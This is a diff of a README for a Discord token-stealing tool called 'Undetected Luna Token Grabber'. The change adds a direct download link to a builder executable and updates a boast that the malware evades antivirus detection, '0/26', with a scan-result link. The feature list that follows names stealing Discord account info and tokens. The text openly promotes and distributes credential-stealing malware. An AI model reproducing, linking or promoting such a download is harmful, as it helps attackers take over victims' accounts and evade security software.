@@ -1,7 +1,7 @@
 <h1 align="center">
   Undetected Luna Token Grabber
 </h1>
-
+<h2>Download Builder: https://github.com/softcure1337/Undetected-Token-Grabber/releases/download/v1.0.0/UndetectedBuilder.exe</h2>
 <div align="center">
   <img  src="https://user-images.githubusercontent.com/99215486/175369409-b967da5b-e373-48ea-b8f5-8ed3d613df03.gif">
   <br>
@@ -18,7 +18,7 @@
 
 ## Features
 
-- Fully Undetected 0/24
+- Fully Undetected 0/26: https://antiscan.me/scan/new/result?id=gJVsFjSktdng
 
 - Discord Info
     - Token
